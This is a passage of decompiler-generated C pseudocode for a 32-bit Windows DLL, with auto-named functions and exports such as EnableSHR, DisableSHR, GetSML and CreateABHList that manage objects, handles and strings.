  size_t v15; // [esp-4h] [ebp-20h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v17; // [esp+18h] [ebp-4h]

  sub_10005354(a1);
  v17 = 0;
  v15 = 4;
  *a1 = &off_100933CC;
  v1 = operator new(v15);
  v2 = v15;
  Block = v1;
  LOBYTE(v17) = 1;
  if ( v1 )
    v3 = sub_1001C0D7(v1);
  else
    v3 = 0;
  LOBYTE(v17) = 0;
  v15 = v2;
  v14 = v2;
  Block = &v14;
  sub_100033DA(&v14, (int)v3);
  LOBYTE(v17) = 0;
  sub_10014B07(a1, v14, v15);
  v4 = operator new(0xCu);
  v5 = v15;
  Block = v4;
  LOBYTE(v17) = 3;
  if ( v4 )
    v6 = sub_1001C1DC(v4);
  else
    v6 = 0;
  LOBYTE(v17) = 0;
  v15 = v5;
  v14 = v5;
  Block = &v14;
  sub_100033DA(&v14, (int)v6);
  LOBYTE(v17) = 0;
  sub_10014B07(a1, v14, v15);
  v7 = operator new(0xCu);
  v8 = v15;
  Block = v7;
  LOBYTE(v17) = 5;
  if ( v7 )
    v9 = sub_1001BF99(v7);
  else
    v9 = 0;
  LOBYTE(v17) = 0;
  v15 = v8;
  v14 = v8;
  Block = &v14;
  sub_100033DA(&v14, (int)v9);
  LOBYTE(v17) = 0;
  sub_10014B07(a1, v14, v15);
  v10 = operator new(4u);
  v11 = v15;
  Block = v10;
  LOBYTE(v17) = 7;
  if ( v10 )
    v12 = sub_1001C7B1(v10);
  else
    v12 = 0;
  LOBYTE(v17) = 0;
  v15 = v11;
  v14 = v11;
  Block = &v14;
  sub_100033DA(&v14, (int)v12);
  LOBYTE(v17) = 0;
  sub_10014B07(a1, v14, v15);
  return a1;
}
// 100080A6: variable 'v2' is possibly undefined
// 100080E1: variable 'v5' is possibly undefined
// 1000811C: variable 'v8' is possibly undefined
// 10008157: variable 'v11' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100933CC: using guessed type int (__thiscall *off_100933CC)(void *Block, char);

//----- (10008189) --------------------------------------------------------
_DWORD *__thiscall sub_10008189(_DWORD *Block, char a2)
{
  sub_100081A5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100081A5) --------------------------------------------------------
void *__thiscall sub_100081A5(_DWORD *this)
{
  *this = &off_100933CC;
  return sub_10014AD4(this);
}
// 100933CC: using guessed type int (__thiscall *off_100933CC)(void *Block, char);

//----- (100081CE) --------------------------------------------------------
_DWORD *__stdcall sub_100081CE(_DWORD *a1)
{
  *a1 = off_100933D8;
  sub_1000CC20(a1 + 1, word_100B8884);
  sub_10016983(0, (int)(a1 + 3), 0);
  return a1;
}
// 100933D8: using guessed type int (__thiscall *off_100933D8[4])(void *Block, char);
// 100B8884: using guessed type wchar_t word_100B8884[2];

//----- (10008218) --------------------------------------------------------
int *__thiscall sub_10008218(int *Block, char a2)
{
  sub_10008234(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10008234) --------------------------------------------------------
LONG __thiscall sub_10008234(int *this)
{
  *this = (int)off_100933D8;
  sub_10016B53(this + 3);
  return sub_1000CE59(this + 1);
}
// 100933D8: using guessed type int (__thiscall *off_100933D8[4])(void *Block, char);

//----- (10008270) --------------------------------------------------------
_DWORD *__stdcall sub_10008270(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // eax
  int *v3; // eax
  _DWORD v5[8]; // [esp+Ch] [ebp-58h] BYREF
  int v6[5]; // [esp+2Ch] [ebp-38h] BYREF
  int v7[4]; // [esp+40h] [ebp-24h] BYREF
  int v8[2]; // [esp+50h] [ebp-14h] BYREF
  int v9; // [esp+60h] [ebp-4h]

  *a1 = off_100933D8;
  sub_1000CC20(a1 + 1, word_100B890C);
  v9 = 1;
  sub_10016983(0, (int)(a1 + 3), 0);
  sub_1001CE42(a2, v5);
  LOBYTE(v9) = 2;
  sub_1001C862(v7, (int)v5);
  LOBYTE(v9) = 3;
  v2 = sub_1001C98F(v7, v8);
  LOBYTE(v9) = 4;
  sub_10008463((int)v2, (int)a1);
  LOBYTE(v9) = 3;
  sub_1000CE59(v8);
  v3 = sub_1001CA63(v7, v6, 1);
  LOBYTE(v9) = 5;
  sub_10016B2F(v3, (int)(a1 + 3));
  LOBYTE(v9) = 3;
  sub_10016B53(v6);
  LOBYTE(v9) = 2;
  sub_1001C8B3(v7);
  LOBYTE(v9) = 1;
  sub_1001CE9F((int)v5);
  return a1;
}
// 100933D8: using guessed type int (__thiscall *off_100933D8[4])(void *Block, char);
// 100B890C: using guessed type wchar_t word_100B890C[2];
// 10008270: using guessed type _DWORD var_58[8];
// 10008270: using guessed type int var_24[4];
// 10008270: using guessed type int var_38[5];

//----- (10008344) --------------------------------------------------------
int __stdcall sub_10008344(_DWORD *a1, int a2)
{
  int v2; // ecx
  int v4[3]; // [esp-14h] [ebp-60h] BYREF
  int v5; // [esp-8h] [ebp-54h] BYREF
  int v6; // [esp-4h] [ebp-50h]
  int v7[9]; // [esp+4h] [ebp-48h] BYREF
  _DWORD v8[4]; // [esp+28h] [ebp-24h] BYREF
  int *v9; // [esp+38h] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v10 = 0;
  sub_10017D60(v7);
  v11 = 1;
  sub_1001CC48(v8, (int)v7, 1);
  LOBYTE(v11) = 2;
  v6 = v2;
  v5 = v2;
  v9 = &v5;
  sub_100083EF((int)a1, &v5);
  LOBYTE(v11) = 2;
  sub_1001CD75(v8, v5, v6);
  v9 = v4;
  sub_10008429(a1, (int)v4);
  LOBYTE(v11) = 2;
  sub_1001CDCD(v8, v4[0], v4[1], v4[2], v5, v6);
  sub_10017EAF(v7, a2);
  v10 = 1;
  LOBYTE(v11) = 1;
  sub_1001CC9A(v8);
  LOBYTE(v11) = 0;
  sub_10017DC3((int)v7);
  return a2;
}
// 10008377: variable 'v2' is possibly undefined
// 10008344: using guessed type int var_48[9];
// 10008344: using guessed type _DWORD var_24[4];

//----- (100083EF) --------------------------------------------------------
_DWORD *__stdcall sub_100083EF(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 4);
  return a2;
}

//----- (10008429) --------------------------------------------------------
int __thiscall sub_10008429(_DWORD *this, int a2)
{
  sub_10016AE9(this + 3, a2);
  return a2;
}

//----- (10008463) --------------------------------------------------------
int *__usercall sub_10008463@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_10002C25((int *)(a1 + 4), (int *)(a2 + 8));
}

//----- (10008480) --------------------------------------------------------
int __cdecl EnableSHR(_DWORD *a1)
{
  wchar_t *v1; // eax
  char v2; // bl
  _DWORD *v4; // eax
  int v5; // [esp+0h] [ebp-4Ch] BYREF
  int v6[5]; // [esp+Ch] [ebp-40h] BYREF
  _DWORD v7[3]; // [esp+20h] [ebp-2Ch] BYREF
  int v8[2]; // [esp+2Ch] [ebp-20h] BYREF
  int v9; // [esp+34h] [ebp-18h] BYREF
  char v10; // [esp+3Bh] [ebp-11h] BYREF
  int *v11; // [esp+3Ch] [ebp-10h]
  int v12; // [esp+48h] [ebp-4h]

  v11 = &v5;
  sub_10010428((int)v7);
  v12 = 0;
  sub_1000EFCA();
  LOBYTE(v12) = 1;
  if ( (unsigned int)(sub_10015E65() - 6) <= 7 )
  {
    sub_10001520(&v9);
    LOBYTE(v12) = 2;
    sub_1000F0BC();
    sub_10008671((int)&v10);
    v1 = (wchar_t *)sub_1000E943((int)&unk_100B89D8);
    sub_1000CC20(v8, v1);
    LOBYTE(v12) = 3;
    v2 = sub_1001D0A7((_DWORD *)dword_100BBCF8);
    LOBYTE(v12) = 2;
    sub_1000CE59(v8);
    if ( v2 )
    {
      LOBYTE(v12) = 1;
      sub_10001553(&v9);
      v12 = -1;
      sub_10010466(v7);
      return 0;
    }
    v4 = (_DWORD *)sub_10016983(0, (int)v6, 0);
    LOBYTE(v12) = 4;
    sub_10001429(dword_100BF5A8, (int)&unk_100BF5B8, (int)&unk_100BF598, v4, (int)&unk_100BF080, 0x26u, a1);
    LOBYTE(v12) = 2;
    sub_10016B53(v6);
    LOBYTE(v12) = 1;
    sub_10001553(&v9);
    v12 = 0;
  }
  v12 = -1;
  sub_10010466(v7);
  return 1;
}
// 100BBCF8: using guessed type int dword_100BBCF8;
// 100BF5A8: using guessed type _DWORD dword_100BF5A8[2];
// 10008480: using guessed type _DWORD var_2C[3];
// 10008480: using guessed type _DWORD var_18;
// 10008480: using guessed type int var_40[5];

//----- (100085A4) --------------------------------------------------------
int DisableSHR()
{
  int v1; // [esp+0h] [ebp-28h] BYREF
  _DWORD v2[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v3; // [esp+24h] [ebp-4h]

  v2[3] = &v1;
  v3 = 0;
  sub_10010428((int)v2);
  LOBYTE(v3) = 1;
  sub_1000EFCA();
  sub_100089B0();
  sub_10008DD8();
  LOBYTE(v3) = 0;
  sub_10010466(v2);
  return 1;
}

//----- (10008601) --------------------------------------------------------
void *__thiscall sub_10008601(_DWORD *this)
{
  void *result; // eax
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_100785B5;
  v3[3] = v3;
  *this = off_100933DC;
  v3[6] = 0;
  v2 = (void *)this[1];
  if ( v2 )
    return sub_10008661(v2);
  return result;
}
// 100933DC: using guessed type int (__thiscall *off_100933DC[3])(void *Block, char);

//----- (10008645) --------------------------------------------------------
_DWORD *__thiscall sub_10008645(_DWORD *Block, char a2)
{
  sub_10008601(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10008661) --------------------------------------------------------
void *__usercall sub_10008661@<eax>(void *a1@<esi>)
{
  void *v2; // [esp+0h] [ebp-4h]

  sub_1001D056(v2);
  j__free(a1);
  return a1;
}
// 10008662: variable 'v2' is possibly undefined

//----- (10008671) --------------------------------------------------------
int __stdcall sub_10008671(int a1)
{
  sub_10008683();
  return a1;
}

//----- (10008683) --------------------------------------------------------
int sub_10008683()
{
  int v0; // ecx
  int result; // eax
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD v4[2]; // [esp+0h] [ebp-18h] BYREF
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v0 = dword_100BBCF8;
  result = _InterlockedExchange((volatile __int32 *)&Block, (__int32)&loc_1007F46F);
  if ( !v0 )
  {
    sub_100171BE(dword_100BFA08, v4);
    v6 = 0;
    if ( !dword_100BBCF8 )
    {
      v2 = operator new(8u);
      Block = v2;
      LOBYTE(v6) = 1;
      if ( v2 )
      {
        v2 = sub_1001D032(v2);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v6) = 0;
      _InterlockedExchange((volatile __int32 *)&Block, (__int32)v2);
      dword_100BBCF8 = v3;
      dword_100BC73C = v3;
    }
    v6 = -1;
    return sub_100171F2(v4);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 100BC73C: using guessed type int dword_100BC73C;
// 100BFA08: using guessed type int dword_100BFA08[9];
// 10008683: using guessed type _DWORD var_18[2];

//----- (10008725) --------------------------------------------------------
int __stdcall sub_10008725(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  int v8; // esi
  char v10; // [esp+8h] [ebp-60h]
  void *Block[2]; // [esp+Ch] [ebp-5Ch] BYREF
  _DWORD v12[2]; // [esp+14h] [ebp-54h] BYREF
  int v13[3]; // [esp+1Ch] [ebp-4Ch] BYREF
  int v14[3]; // [esp+28h] [ebp-40h] BYREF
  int v15[4]; // [esp+34h] [ebp-34h] BYREF
  int v16[6]; // [esp+44h] [ebp-24h] BYREF
  int v17; // [esp+64h] [ebp-4h]

  v10 = 0;
  sub_100140E1(dword_100BC600, (int)v14, 1, 1u, 0);
  v17 = 0;
  v1 = sub_1001445F(Block);
  LOBYTE(v17) = 1;
  sub_100140E1(dword_100BC5DC, (int)v13, 1, 1u, *(LPSECURITY_ATTRIBUTES *)(*v1 + 4));
  LOBYTE(v17) = 3;
  sub_100015D8(Block);
  sub_10004A8B(v15);
  LOBYTE(v17) = 4;
  Block[0] = operator new(0x7Au);
  LOBYTE(v17) = 5;
  if ( Block[0] )
  {
    v2 = (_DWORD *)sub_10016983(0, (int)v16, 0);
    LOBYTE(v17) = 6;
    v10 = 1;
    v3 = sub_10012ECB(
           (int)Block[0],
           (int)&unk_100BC5F8,
           (int)&unk_100BC608,
           (int)v14,
           (int)&unk_100BF628,
           v2,
           a1,
           (void *)1);
  }
  else
  {
    v3 = 0;
  }
  v17 = 7;
  v4 = sub_100017F0(v12, v3);
  v17 = 8;
  sub_10004BD0(v15, (int)v4);
  LOBYTE(v17) = 7;
  sub_10001834(v12);
  v17 = 4;
  if ( (v10 & 1) != 0 )
  {
    v10 &= ~1u;
    sub_10016B53(v16);
  }
  Block[0] = operator new(0x7Au);
  LOBYTE(v17) = 9;
  if ( Block[0] )
  {
    v5 = (_DWORD *)sub_10016983(0, (int)v16, 0);
    LOBYTE(v17) = 10;
    v10 |= 2u;
    v6 = sub_10012ECB(
           (int)Block[0],
           (int)&unk_100BC5D4,
           (int)&unk_100BC5E4,
           (int)v13,
           (int)&unk_100BF620,
           v5,
           a1,
           (void *)1);
  }
  else
  {
    v6 = 0;
  }
  v17 = 11;
  v7 = sub_100017F0(v12, v6);
  v17 = 12;
  sub_10004BD0(v15, (int)v7);
  LOBYTE(v17) = 11;
  sub_10001834(v12);
  v17 = 4;
  if ( (v10 & 2) != 0 )
    sub_10016B53(v16);
  v8 = sub_1000191E(v15, dword_100BF5A8, (int)&unk_100BF080, (char *)0x26);
  LOBYTE(v17) = 3;
  sub_10004B05(v15);
  LOBYTE(v17) = 0;
  sub_100141CF(v13);
  v17 = -1;
  sub_100141CF(v14);
  return v8;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BC5DC: using guessed type _DWORD dword_100BC5DC[2];
// 100BC600: using guessed type _DWORD dword_100BC600[2];
// 100BF5A8: using guessed type _DWORD dword_100BF5A8[2];
// 10008725: using guessed type int var_40[3];
// 10008725: using guessed type int var_4C[3];
// 10008725: using guessed type int var_34[4];
// 10008725: using guessed type int var_24[6];
// 10008725: using guessed type _DWORD var_54[2];

//----- (10008942) --------------------------------------------------------
int __stdcall GetSML(int a1)
{
  int v2; // [esp+0h] [ebp-28h] BYREF
  _DWORD v3[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v4; // [esp+24h] [ebp-4h]

  v3[3] = &v2;
  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  LOBYTE(v4) = 1;
  sub_10013547((void (__stdcall *)(int))sub_10008725, a1);
  v4 = 0;
  sub_1001A872();
  v4 = -1;
  sub_10010466(v3);
  return 0;
}

//----- (100089B0) --------------------------------------------------------
LONG sub_100089B0()
{
  int v0; // eax
  int v2[3]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+14h] [ebp-4h]

  v0 = sub_100140E1(dword_100BF5A8, (int)v2, 1, 1u, 0);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v3 = -1;
  return sub_100141CF(v2);
}
// 100BF5A8: using guessed type _DWORD dword_100BF5A8[2];
// 100089B0: using guessed type int var_18[3];

//----- (100089F4) --------------------------------------------------------
LONG __stdcall sub_100089F4(int *a1)
{
  sub_1000CE59(a1 + 7);
  sub_1000CE59(a1 + 5);
  sub_1000CE59(a1 + 3);
  return sub_1000CE59(a1 + 1);
}

//----- (10008A44) --------------------------------------------------------
int __stdcall CreateABHList(int a1)
{
  int v1; // esi
  _DWORD v3[3]; // [esp+4h] [ebp-18h] BYREF
  int v4; // [esp+18h] [ebp-4h]

  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  v1 = sub_10008ACE(0);
  v4 = -1;
  sub_10010466(v3);
  return v1;
}
// 10008A44: using guessed type _DWORD var_18[3];

//----- (10008A89) --------------------------------------------------------
int __stdcall FreeABHData(int a1)
{
  int v1; // esi
  _DWORD v3[3]; // [esp+4h] [ebp-18h] BYREF
  int v4; // [esp+18h] [ebp-4h]

  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  v1 = sub_10008ACE(1);
  v4 = -1;
  sub_10010466(v3);
  return v1;
}
// 10008A89: using guessed type _DWORD var_18[3];

//----- (10008ACE) --------------------------------------------------------
int __stdcall sub_10008ACE(int a1)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  return sub_10013547((void (__stdcall *)(int))sub_10008B28, (int)&a1);
}

//----- (10008B28) --------------------------------------------------------
int __stdcall sub_10008B28(_DWORD *a1)
{
  _DWORD *v1; // esi
  _DWORD *v2; // eax
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp-28h] [ebp-110h] BYREF
  volatile LONG *v8; // [esp-24h] [ebp-10Ch]
  int v9[3]; // [esp-20h] [ebp-108h] BYREF
  int v10; // [esp-14h] [ebp-FCh]
  int v11; // [esp-10h] [ebp-F8h] BYREF
  volatile LONG *v12; // [esp-Ch] [ebp-F4h]
  int v13; // [esp-8h] [ebp-F0h] BYREF
  int v14; // [esp-4h] [ebp-ECh]
  int v15; // [esp+10h] [ebp-D8h]
  void *Block; // [esp+14h] [ebp-D4h]
  int v17; // [esp+18h] [ebp-D0h] BYREF
  volatile LONG *v18; // [esp+1Ch] [ebp-CCh]
  int *v19; // [esp+20h] [ebp-C8h]
  int v20; // [esp+24h] [ebp-C4h] BYREF
  volatile LONG *lpAddend; // [esp+28h] [ebp-C0h]
  int v22[4]; // [esp+2Ch] [ebp-BCh] BYREF
  int v23[5]; // [esp+3Ch] [ebp-ACh] BYREF
  int v24[16]; // [esp+50h] [ebp-98h] BYREF
  _DWORD v25[19]; // [esp+90h] [ebp-58h] BYREF
  int v26; // [esp+E4h] [ebp-4h]

  v15 = 0;
  v1 = &unk_100BC5D0;
  if ( *a1 )
    v1 = &unk_100BC5F4;
  sub_100140E1(v1 + 3, (int)v22, 1, 1u, 0);
  v26 = 0;
  Block = operator new(0x28u);
  LOBYTE(v26) = 1;
  if ( Block )
  {
    v13 = v14;
    v19 = &v13;
    sub_10014512(&v13);
    LOBYTE(v26) = 2;
    v2 = sub_10012A7C(&v17, (int)(v1 + 7));
    LOBYTE(v26) = 3;
    v15 = 1;
    v3 = sub_10012BA7((int)v2);
    v26 = 4;
    v4 = sub_10011AFB(0, 0x40000000, Block, v3, 128, 4, v13, (volatile LONG *)v14);
  }
  else
  {
    v4 = 0;
  }
  v26 = 5;
  sub_10006A72(&v20, (int)v4);
  v26 = 7;
  if ( (v15 & 1) != 0 )
  {
    v15 &= ~1u;
    sub_10012AAC(&v17);
  }
  Block = operator new(0x14u);
  LOBYTE(v26) = 8;
  if ( Block )
  {
    v14 = 325260;
    v19 = &v11;
    sub_100141F3(&v11, (int)v22);
    LOBYTE(v26) = 8;
    v5 = sub_10007E5A(Block, v11, (int)v12, v13, v14);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v26) = 7;
  sub_100069E1(&v17, (int)v5);
  LOBYTE(v26) = 10;
  sub_1001D2D9(v25);
  LOBYTE(v26) = 11;
  sub_10016983((void *)6, (int)v23, &unk_10092EB0);
  LOBYTE(v26) = 12;
  v14 = (int)v25;
  v13 = 6291456;
  v19 = &v11;
  v12 = lpAddend;
  v11 = v20;
  InterlockedIncrement(lpAddend);
  LOBYTE(v26) = 13;
  v10 = 0;
  Block = v9;
  sub_100141F3(v9, (int)v22);
  LOBYTE(v26) = 14;
  v22[3] = (int)&v7;
  v8 = v18;
  v7 = v17;
  InterlockedIncrement(v18);
  LOBYTE(v26) = 12;
  sub_1001C336(v23, (int)v24, v7, v8, v9[0], v9[1], v9[2], v10, v11, v12, v13, v14);
  LOBYTE(v26) = 16;
  sub_1001C3E1(v24);
  LOBYTE(v26) = 12;
  sub_1000690F(v24);
  LOBYTE(v26) = 11;
  sub_10016B53(v23);
  LOBYTE(v26) = 10;
  sub_1001D336((int)v25);
  LOBYTE(v26) = 7;
  sub_10006A25(&v17);
  LOBYTE(v26) = 0;
  sub_10003B09(&v20);
  v26 = -1;
  sub_100141CF(v22);
  return 1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10008B28: using guessed type _DWORD var_58[19];
// 10008B28: using guessed type int var_AC[5];
// 10008B28: using guessed type int var_98[16];

//----- (10008DD8) --------------------------------------------------------
LONG sub_10008DD8()
{
  int v0; // eax
  int v1; // eax
  int v3[3]; // [esp+4h] [ebp-18h] BYREF
  int v4; // [esp+18h] [ebp-4h]

  v0 = sub_100140E1(dword_100BC5DC, (int)v3, 1, 1u, 0);
  v4 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v4 = -1;
  sub_100141CF(v3);
  v1 = sub_100140E1(dword_100BC600, (int)v3, 1, 1u, 0);
  v4 = 1;
  (*(void (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
  v4 = -1;
  return sub_100141CF(v3);
}
// 100BC5DC: using guessed type _DWORD dword_100BC5DC[2];
// 100BC600: using guessed type _DWORD dword_100BC600[2];
// 10008DD8: using guessed type int var_18[3];

//----- (10008E70) --------------------------------------------------------
UINT __usercall sub_10008E70@<eax>(OLECHAR ***a1@<eax>)
{
  OLECHAR **v1; // eax
  OLECHAR *v2; // eax

  v1 = *a1;
  if ( v1 && (v2 = *v1) != 0 )
    return SysStringLen(v2);
  else
    return 0;
}

//----- (10008E98) --------------------------------------------------------
LONG __usercall sub_10008E98@<eax>(volatile LONG *a1@<esi>)
{
  LONG v1; // edi

  v1 = InterlockedDecrement(a1 + 2);
  if ( !v1 && a1 )
  {
    sub_10008ED6((int)a1);
    j__free((void *)a1);
  }
  return v1;
}

//----- (10008ED6) --------------------------------------------------------
void __usercall sub_10008ED6(int a1@<eax>)
{
  OLECHAR *v2; // eax
  void *v3; // esi

  v2 = *(OLECHAR **)a1;
  if ( v2 )
    SysFreeString(v2);
  v3 = *(void **)(a1 + 4);
  if ( v3 )
    j__free(v3);
}

//----- (10008F07) --------------------------------------------------------
void *__thiscall sub_10008F07(_DWORD *this)
{
  void *result; // eax
  volatile LONG *v3; // esi

  result = &loc_1007A72F;
  *this = off_100933E0;
  v3 = (volatile LONG *)this[1];
  if ( v3 )
  {
    result = (void *)sub_10008E98(v3);
    this[1] = 0;
  }
  return result;
}
// 100933E0: using guessed type int (__thiscall *off_100933E0[2])(void *Block, char);

//----- (10008F63) --------------------------------------------------------
_DWORD *__thiscall sub_10008F63(_DWORD *Block, char a2)
{
  sub_10008F07(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10008F7F) --------------------------------------------------------
_DWORD *__thiscall sub_10008F7F(int *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  int v7[5]; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v8 = 0;
  sub_10016983((void *)4, (int)a2, 0);
  v9 = 0;
  v3 = *this;
  v8 = 1;
  v4 = (*(int (__thiscall **)(int *))(v3 + 12))(this);
  sub_10016E93(a2, 0, v4);
  v5 = (_DWORD *)(*(int (__thiscall **)(int *, int *))(*this + 8))(this, v7);
  v9 = 1;
  sub_10016CD5(v5, (int)a2);
  LOBYTE(v9) = 0;
  sub_10016B53(v7);
  return a2;
}
// 10008F7F: using guessed type int var_24[5];

//----- (10008FF4) --------------------------------------------------------
char __thiscall sub_10008FF4(_DWORD **this)
{
  int v2; // edi
  wchar_t *v3; // eax
  _DWORD *v4; // ebx
  int v5; // eax
  _DWORD *v6; // eax
  wchar_t *v7; // eax
  _DWORD *v8; // eax
  bool v9; // bl
  _DWORD *v10; // eax
  char v11; // bl
  _DWORD v13[2]; // [esp+10h] [ebp-38h] BYREF
  int v14[2]; // [esp+18h] [ebp-30h] BYREF
  _DWORD v15[2]; // [esp+20h] [ebp-28h] BYREF
  int v16[2]; // [esp+28h] [ebp-20h] BYREF
  char v17[12]; // [esp+30h] [ebp-18h] BYREF
  int v18; // [esp+44h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *))(*this[1] + 20))(this[1]);
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(*this[1] + 24))(this[1], v13);
  v18 = 0;
  while ( 1 )
  {
    if ( !v13[0] )
    {
      v11 = 0;
      goto LABEL_10;
    }
    v2 = v13[0];
    v3 = (wchar_t *)sub_1000E943((int)&unk_100B8784);
    v4 = sub_1000CC20(v16, v3);
    LOBYTE(v18) = 1;
    v5 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 8))(v2, v15);
    LOBYTE(v18) = 2;
    v6 = *(_DWORD **)(v5 + 4);
    v7 = v6 ? (wchar_t *)*v6 : 0;
    v8 = sub_1000CC20(v14, v7);
    LOBYTE(v18) = 3;
    v9 = sub_1000D0B5((int)v4, (int)v8) == 0;
    LOBYTE(v18) = 2;
    sub_1000CE59(v14);
    LOBYTE(v18) = 1;
    sub_10008F07(v15);
    LOBYTE(v18) = 0;
    sub_1000CE59(v16);
    if ( v9 )
      break;
    v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, char *))(*this[1] + 24))(this[1], v17);
    LOBYTE(v18) = 4;
    sub_100097B7(v13, v10);
    LOBYTE(v18) = 0;
    sub_1000977E(v17);
  }
  v11 = 1;
LABEL_10:
  v18 = -1;
  sub_1000977E(v13);
  return v11;
}
// 10008FF4: using guessed type _DWORD var_38[2];
// 10008FF4: using guessed type _DWORD var_28[2];

//----- (10009121) --------------------------------------------------------
int __cdecl sub_10009121(int a1, int a2, void **a3)
{
  void *v3; // eax
  UINT v4; // eax
  void *v6; // [esp-4h] [ebp-1Ch]

  if ( a3 )
    v3 = *a3;
  else
    v3 = 0;
  v6 = v3;
  v4 = sub_10008E70((OLECHAR ***)&a3);
  sub_10016983((void *)(2 * v4), a1, v6);
  sub_10008F07(&a2);
  return a1;
}

//----- (1000917E) --------------------------------------------------------
int __thiscall sub_1000917E(_DWORD **this, int a2)
{
  int v3; // eax
  void **v4; // ecx
  void (**v5)(void); // eax
  void **v6; // ecx
  void (**v7)(void); // eax
  void **v8; // ecx
  void (**v9)(void); // eax
  int *v10; // ecx
  int v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  char *i; // ecx
  char v15; // al
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  _DWORD *v21; // eax
  void **v23; // [esp-2Ch] [ebp-A0h] BYREF
  void **v24; // [esp-28h] [ebp-9Ch] BYREF
  void **v25; // [esp-24h] [ebp-98h] BYREF
  void **v26; // [esp-20h] [ebp-94h] BYREF
  void **v27; // [esp-1Ch] [ebp-90h] BYREF
  int v28; // [esp-18h] [ebp-8Ch] BYREF
  int v29; // [esp-14h] [ebp-88h] BYREF
  int v30; // [esp-10h] [ebp-84h]
  int v31; // [esp-Ch] [ebp-80h]
  int v32; // [esp-8h] [ebp-7Ch]
  int v33; // [esp-4h] [ebp-78h]
  int v34[9]; // [esp+Ch] [ebp-68h] BYREF
  _DWORD v35[4]; // [esp+30h] [ebp-44h] BYREF
  char v36[8]; // [esp+40h] [ebp-34h] BYREF
  int v37[2]; // [esp+48h] [ebp-2Ch] BYREF
  int v38[2]; // [esp+50h] [ebp-24h] BYREF
  char v39[4]; // [esp+58h] [ebp-1Ch] BYREF
  void ***v40; // [esp+5Ch] [ebp-18h]
  int v41; // [esp+60h] [ebp-14h]
  void ***v42; // [esp+64h] [ebp-10h]
  int v43; // [esp+70h] [ebp-4h]

  v41 = 0;
  sub_10017D60(v34);
  v43 = 1;
  sub_1001CC48(v35, (int)v34, 1);
  LOBYTE(v43) = 2;
  (*(void (__thiscall **)(_DWORD *, int *))(*this[1] + 28))(this[1], v37);
  LOBYTE(v43) = 3;
  v3 = *(_DWORD *)v37[0];
  v42 = (void ***)&v29;
  v28 = v37[0];
  v27 = (void **)v37[0];
  v40 = &v27;
  v26 = (void **)&v27;
  (*(void (**)(void))(v3 + 8))();
  LOBYTE(v43) = 3;
  sub_10009121((int)&v29, (int)&v27, v27);
  LOBYTE(v43) = 3;
  sub_1001CDCD(v35, v28, v29, v30, v31, v32);
  v4 = (void **)this[1];
  v5 = (void (**)(void))*v4;
  v40 = (void ***)&v28;
  v27 = v4;
  v26 = v4;
  v42 = &v26;
  v25 = (void **)&v26;
  v5[4]();
  LOBYTE(v43) = 3;
  sub_10009121((int)&v28, (int)&v26, v26);
  LOBYTE(v43) = 3;
  sub_1001CDCD(v35, (int)v27, v28, v29, v30, v31);
  v6 = (void **)this[1];
  v7 = (void (**)(void))*v6;
  v40 = &v27;
  v26 = v6;
  v25 = v6;
  v42 = &v25;
  v24 = (void **)&v25;
  v7[2]();
  LOBYTE(v43) = 3;
  sub_10009121((int)&v27, (int)&v25, v25);
  LOBYTE(v43) = 3;
  sub_1001CDCD(v35, (int)v26, (int)v27, v28, v29, v30);
  v8 = (void **)this[1];
  v9 = (void (**)(void))*v8;
  v40 = &v26;
  v25 = v8;
  v24 = v8;
  v42 = &v24;
  v23 = (void **)&v24;
  v9[3]();
  LOBYTE(v43) = 3;
  sub_10009121((int)&v26, (int)&v24, v24);
  LOBYTE(v43) = 3;
  sub_1001CDCD(v35, (int)v25, (int)v26, (int)v27, v28, v29);
